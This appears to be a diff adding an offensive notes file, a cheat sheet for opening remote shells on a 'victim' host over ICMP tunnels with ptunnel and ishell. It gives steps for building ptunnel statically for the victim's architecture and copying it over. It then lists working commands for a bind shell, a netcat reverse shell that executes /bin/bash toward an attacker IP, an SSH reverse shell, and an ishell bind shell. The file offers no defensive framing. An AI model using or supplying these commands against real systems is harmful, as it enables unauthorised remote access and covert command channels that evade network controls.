@@ -1,0 +1,48 @@
+# icmpshells
+
+# ptunnel
+tested with PingTunnel-0.72
+need to run client & server as root
+
+ptunnel depends on libpcap so if victim host does not have it, build ptunnel as static
+remember to build on a host that has the same arch as the victim's (x86 vs x86_64 etc.)
+
+tar xf libpcap-0.8.1 ; ./configure && make
+change LDOPTS = /usr/lib/libpthread.a /root/PingTunnel/libpcap-0.8.1/libpcap.a
+add -static to the ptunnel: target
+get rid of the selinux crap
+scp ptunnel victimip:
+
+* bind shell
+victim:
+./ptunnel
+
+attacker:
+./ptunnel -p victimip -lp 2222 -da 127.0.0.1 -dp 22
+ssh -p 2222 127.0.0.1
+
+* reverse shell (netcat)
+victim:
+./ptunnel -p attackerip -lp 4321 -da 127.0.0.1 -dp 1234
+nc -vn 127.0.0.1 4321 -e /bin/bash
+
+attacker:
+./ptunnel
+nc -vnlp 1234
+
+* reverse shell (ssh)
+victim:
+./ptunnel -p attackerip -lp 2222 -da 127.0.0.1 -dp 22
+ssh -p 2222 -R 1234:127.0.0.1:22 seb@127.0.0.1
+
+attacker:
+./ptunnel
+ssh -p 1234 root@127.0.0.1
+
+# icmpshell
+* bind shell with ishell v2.0
+victim:
+./ishd -t 8
+
+attacker:
+./ish -t 8 victimip
